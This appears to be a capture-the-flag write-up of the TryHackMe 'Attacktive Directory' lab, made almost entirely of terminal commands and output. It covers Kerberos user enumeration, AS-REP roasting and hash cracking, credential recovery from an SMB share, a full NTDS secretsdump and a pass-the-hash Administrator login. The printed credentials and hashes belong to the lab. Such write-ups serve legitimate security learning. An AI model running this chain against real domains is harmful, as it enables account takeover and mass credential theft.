# Scan

```bash
khant@Khants-MacBook-Pro [17:32:02] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master]
-> % rustscan -a $IP -- -sC -sV
  
Open 10.10.11.13:53
Open 10.10.11.13:88
Open 10.10.11.13:80
Open 10.10.11.13:139
Open 10.10.11.13:135
Open 10.10.11.13:389
Open 10.10.11.13:445
Open 10.10.11.13:464
Open 10.10.11.13:593
Open 10.10.11.13:636
Open 10.10.11.13:3269
Open 10.10.11.13:3268
Open 10.10.11.13:3389
Open 10.10.11.13:5985
Open 10.10.11.13:9389
Open 10.10.11.13:47001
Open 10.10.11.13:49667
Open 10.10.11.13:49676
Open 10.10.11.13:49674
Open 10.10.11.13:49669
Open 10.10.11.13:49675
Open 10.10.11.13:49679
Open 10.10.11.13:49665
Open 10.10.11.13:49664
Open 10.10.11.13:49684
Open 10.10.11.13:49694
Open 10.10.11.13:49811
  
PORT STATE SERVICE REASON VERSION
53/tcp open domain syn-ack Simple DNS Plus
80/tcp open http syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
| Supported Methods: OPTIONS TRACE GET HEAD POST
|_ Potentially risky methods: TRACE
88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-12-02 09:34:13Z)
135/tcp open msrpc syn-ack Microsoft Windows RPC
139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds? syn-ack
464/tcp open kpasswd5? syn-ack
593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped syn-ack
3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open tcpwrapped syn-ack
3389/tcp open ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-01T09:14:16
| Not valid after: 2023-06-02T09:14:16
| MD5: 27e1f2280abb01d89dc3967541f0afbf
| SHA-1: 470b720b819ece6e718a4ff6041d837dc71400f1
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQQEtv0HC9LqhAYh7H6g0QJTANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yMjEyMDEwOTE0MTZaFw0yMzA2MDIwOTE0MTZaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAoCCnyRN4mPyDPZVBLh8OleZbDkufC9hgVz73Eg9tTlJf
| 4airTh58LDVvd51bmQMqIkn5DjWgeDbTjgFyEupe/Sq/CcchQlwG70/lrAeRmvOv
| rcKYDQ/ld1T89giG8fQkXxzaDhreqJmR9A3p8e1vQTPaLdptbZu8jsHVkdIAI9Bc
| 7ruqgT8MoHBkSMA8zRvo0hGgQL4ovH6ipM6gN+hT0uhzvEPNFSBUcqAvHM6124Iy
| 1p95rDOSQS2FNUgQCbre2Nc6war3S5AYBqluPAhE9wGi907Rm88/KXxc1lOqxjL2
| pXsn3GyOjkR1BFuaXXelY5i8NAvcTYboDqdbryc2tQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBADau
| P44nTtKHe/e/lDzsrAWO37ofGgGrWUwpH7dqq2Nbi2Sgc47F79e+2d1F7jjQtDI2
| fzqhvWxUjP0yziSabK4Vkb1MJr/SYosB4SGkzghU5VXSX7YF3Ci8GYnya2WgMi2D
| of9UPUhrZmeoAp311EsTpvdQKt4tzvyiSaH4B/JrpGBA66l4XLJufQW9CcYHhQPf
| u+A1Xs8AJ4fHDmqmrfNHXZoJazsn0tspIwbwJSicIpwzW+NYZRcL2Mz8HLwEey4m
| uyPi615WQTk/YH4nn6QmxS3xQoRPxgf9gJjvo1JLd18E1l5apdMay+ZQheRRPK7a
| C7BYmiItdT3iyT4V8i8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
| Target_Name: THM-AD
| NetBIOS_Domain_Name: THM-AD
| NetBIOS_Computer_Name: ATTACKTIVEDIREC
| DNS_Domain_Name: spookysec.local
| DNS_Computer_Name: AttacktiveDirectory.spookysec.local
| Product_Version: 10.0.17763
|_ System_Time: 2022-12-02T09:35:13+00:00
|_ssl-date: 2022-12-02T09:35:23+00:00; +1s from scanner time.
5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf syn-ack .NET Message Framing
47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc syn-ack Microsoft Windows RPC
49665/tcp open msrpc syn-ack Microsoft Windows RPC
49667/tcp open msrpc syn-ack Microsoft Windows RPC
49669/tcp open msrpc syn-ack Microsoft Windows RPC
49674/tcp open msrpc syn-ack Microsoft Windows RPC
49675/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
49676/tcp open msrpc syn-ack Microsoft Windows RPC
49679/tcp open msrpc syn-ack Microsoft Windows RPC
49684/tcp open msrpc syn-ack Microsoft Windows RPC
49694/tcp open msrpc syn-ack Microsoft Windows RPC
49811/tcp open msrpc syn-ack Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows


Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode:
| 311:
|_ Message signing enabled and required
| p2p-conficker:
| Checking for Conficker.C or higher...
| Check 1 (port 14398/tcp): CLEAN (Couldn't connect)
| Check 2 (port 38431/tcp): CLEAN (Couldn't connect)
| Check 3 (port 24772/udp): CLEAN (Timeout)
| Check 4 (port 45275/udp): CLEAN (Failed to receive data)
|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
| date: 2022-12-02T09:35:13
|_ start_date: N/A
```


# Kerbrute (enumeration)

```bash
ghost@localhost [22:29:14] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % kerbrute userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local userlist.txt

2022/12/02 22:29:28 >  Using KDC(s):
2022/12/02 22:29:28 >   AttacktiveDirectory.spookysec.local:88

2022/12/02 22:29:29 >  [+] VALID USERNAME:       james@spookysec.local
2022/12/02 22:29:34 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/12/02 22:29:39 >  [+] VALID USERNAME:       James@spookysec.local
2022/12/02 22:29:41 >  [+] VALID USERNAME:       robin@spookysec.local
2022/12/02 22:30:03 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/12/02 22:30:16 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/12/02 22:30:43 >  [+] VALID USERNAME:       backup@spookysec.local
2022/12/02 22:30:56 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/12/02 22:32:17 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/12/02 22:32:50 >  [+] VALID USERNAME:       Robin@spookysec.local
2022/12/02 22:35:42 >  [+] VALID USERNAME:       Administrator@spookysec.local
...
```

### GetNPUsers

```bash
ghost@localhost [22:42:15] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % GetNPUsers.py spookysec.local/ -dc-ip $IP -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:4c62cc30a0e14613d82922c2cddc20b3$c0d5593237b437fa1a3900106e2cc9cd60f6991c07a68d8abcaa7737e5344611d7e5cb68a1d06099942b8b926515e7f3169e2f666015db8216f528983da204d427bd10027993778253a81e985812f9617905c8ade36c96065306d5308e058786d326f276958771ee6d431cffe2be5ed2498c77377fb58603b41416ed57d533c62c59728a4582bf7153d3e047a9f881d168de975b364346fefca42d63e0115e2872d8994a9ea4f32c1df36f570903c8509f3b6f73533df2f599a36d78bb1e8084fe1ea83d8f18e10285ecae03817ddd0a5b0f283b17b6792e285037f6b4bef37e86885c619fe57a9dd4aabd1087f30c91f561
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Cracking the hash with hashcat.

```bash
ghost@localhost [23:04:52] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % hashcat kerberos-ticket-hash /usr/share/wordlists/rockyou.txt -m 18200
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-9600K CPU @ 3.70GHz, 6867/13799 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:4c62cc30a0e14613d82922c2cddc20b3$c0d5593237b437fa1a3900106e2cc9cd60f6991c07a68d8abcaa7737e5344611d7e5cb68a1d06099942b8b926515e7f3169e2f666015db8216f528983da204d427bd10027993778253a81e985812f9617905c8ade36c96065306d5308e058786d326f276958771ee6d431cffe2be5ed2498c77377fb58603b41416ed57d533c62c59728a4582bf7153d3e047a9f881d168de975b364346fefca42d63e0115e2872d8994a9ea4f32c1df36f570903c8509f3b6f73533df2f599a36d78bb1e8084fe1ea83d8f18e10285ecae03817ddd0a5b0f283b17b6792e285037f6b4bef37e86885c619fe57a9dd4aabd1087f30c91f561:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:4c62cc30a0e...91f561
Time.Started.....: Fri Dec  2 23:05:11 2022 (3 secs)
Time.Estimated...: Fri Dec  2 23:05:14 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2287.7 kH/s (1.65ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5842944/14344385 (40.73%)
Rejected.........: 0/5842944 (0.00%)
Restore.Point....: 5836800/14344385 (40.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: manaiagal -> mamglo
Hardware.Mon.#1..: Temp: 55c Util: 80%

Started: Fri Dec  2 23:04:56 2022
Stopped: Fri Dec  2 23:05:15 2022
```

The credential is `svc-admin:management2005`.

## List shares (with smbclient)

```bash
ghost@localhost [23:09:53] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % smbclient -L \\\\10.10.11.13 --user=svc-admin --password=management2005

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.13 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I can connect to `backup`.

```bash
ghost@localhost [23:11:29] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % smbclient \\\\10.10.11.13\\backup --user=svc-admin --password=management2005
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 03:08:39 2020
  ..                                  D        0  Sun Apr  5 03:08:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 03:08:53 2020

                8247551 blocks of size 4096. 3570295 blocks available
smb: \>
```

Reading a file.

```bash
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

...

ghost@localhost [23:13:49] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % cat backup_credentials.txt -p
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Looks like base64.

```bash
ghost@localhost [23:13:52] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```

Then I use that to dump the secrets.

```bash
ghost@localhost [23:15:29] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % python3 ~/.local/scripts/impacket/examples/secretsdump.py -just-dc backup:backup2517860@10.10.11.13
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:4ee294e2bbac36443454a4f1115c820c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:b9033be3163b6eb544aba2d8c4801b1d79f8be9859ab0e9021013f2e21b60edf
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:f3398419f2f186cb8c3b19797b1c00a1
ATTACKTIVEDIREC$:des-cbc-md5:0e52a26e89b3b9a2
[*] Cleaning up...
```

Administrator NTLM hash is *0e0363213e37b94221497260b0bcb4fc*.

I use that to login with `evil-winrm`.

  

```bash
ghost@localhost [23:19:54] [~/Documents/hacking/hackthebox/THM/attacktivedirectory] [master *]
-> % evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.11.13

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
